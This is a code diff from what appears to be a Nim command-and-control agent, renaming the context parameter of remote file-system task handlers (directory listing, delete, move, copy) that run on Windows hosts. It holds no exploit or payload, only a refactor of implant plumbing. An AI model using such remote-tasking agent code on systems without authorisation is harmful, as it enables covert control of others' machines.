@@ -1,13 +1,13 @@
 import ../common/[types, utils]
 
 # Define function prototypes
-proc executePwd(config: AgentConfig, task: Task): TaskResult
-proc executeCd(config: AgentConfig, task: Task): TaskResult
-proc executeDir(config: AgentConfig, task: Task): TaskResult
-proc executeRm(config: AgentConfig, task: Task): TaskResult
-proc executeRmdir(config: AgentConfig, task: Task): TaskResult
-proc executeMove(config: AgentConfig, task: Task): TaskResult 
-proc executeCopy(config: AgentConfig, task: Task): TaskResult 
+proc executePwd(ctx: AgentCtx, task: Task): TaskResult
+proc executeCd(ctx: AgentCtx, task: Task): TaskResult
+proc executeDir(ctx: AgentCtx, task: Task): TaskResult
+proc executeRm(ctx: AgentCtx, task: Task): TaskResult
+proc executeRmdir(ctx: AgentCtx, task: Task): TaskResult
+proc executeMove(ctx: AgentCtx, task: Task): TaskResult 
+proc executeCopy(ctx: AgentCtx, task: Task): TaskResult 
 
 # Command definitions
 let commands* = @[
@@ -85,21 +85,21 @@ let commands* = @[
 
 # Implementation of the execution functions
 when defined(server):
-    proc executePwd(config: AgentConfig, task: Task): TaskResult = nil
-    proc executeCd(config: AgentConfig, task: Task): TaskResult = nil
-    proc executeDir(config: AgentConfig, task: Task): TaskResult = nil
-    proc executeRm(config: AgentConfig, task: Task): TaskResult = nil
-    proc executeRmdir(config: AgentConfig, task: Task): TaskResult = nil
-    proc executeMove(config: AgentConfig, task: Task): TaskResult = nil
-    proc executeCopy(config: AgentConfig, task: Task): TaskResult = nil
+    proc executePwd(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeCd(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeDir(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeRm(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeRmdir(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeMove(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeCopy(ctx: AgentCtx, task: Task): TaskResult = nil
 
 when defined(agent):
 
     import os, strutils, strformat, times, algorithm, winim
-    import ../agent/core/taskresult
+    import ../agent/protocol/result
 
     # Retrieve current working directory
-    proc executePwd(config: AgentConfig, task: Task): TaskResult = 
+    proc executePwd(ctx: AgentCtx, task: Task): TaskResult = 
 
         echo fmt"   [>] Retrieving current working directory."
 
@@ -120,7 +120,7 @@ when defined(agent):
 
 
     # Change working directory
-    proc executeCd(config: AgentConfig, task: Task): TaskResult = 
+    proc executeCd(ctx: AgentCtx, task: Task): TaskResult = 
 
         # Parse arguments
         let targetDirectory = Bytes.toString(task.args[0].data)
@@ -139,7 +139,7 @@ when defined(agent):
 
 
     # List files and directories at a specific or at the current path
-    proc executeDir(config: AgentConfig, task: Task): TaskResult = 
+    proc executeDir(ctx: AgentCtx, task: Task): TaskResult = 
 
         try:
             var targetDirectory: string
@@ -289,7 +289,7 @@ when defined(agent):
 
 
     # Remove file 
-    proc executeRm(config: AgentConfig, task: Task): TaskResult = 
+    proc executeRm(ctx: AgentCtx, task: Task): TaskResult = 
 
         # Parse arguments
         let target = Bytes.toString(task.args[0].data)
@@ -307,7 +307,7 @@ when defined(agent):
             
 
     # Remove directory
-    proc executeRmdir(config: AgentConfig, task: Task): TaskResult = 
+    proc executeRmdir(ctx: AgentCtx, task: Task): TaskResult = 
 
         # Parse arguments
         let target = Bytes.toString(task.args[0].data)
@@ -324,7 +324,7 @@ when defined(agent):
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     # Move file or directory
-    proc executeMove(config: AgentConfig, task: Task): TaskResult = 
+    proc executeMove(ctx: AgentCtx, task: Task): TaskResult = 
 
         # Parse arguments
         let 
@@ -344,7 +344,7 @@ when defined(agent):
 
 
     # Copy file or directory
-    proc executeCopy(config: AgentConfig, task: Task): TaskResult = 
+    proc executeCopy(ctx: AgentCtx, task: Task): TaskResult = 
 
         # Parse arguments
         let 
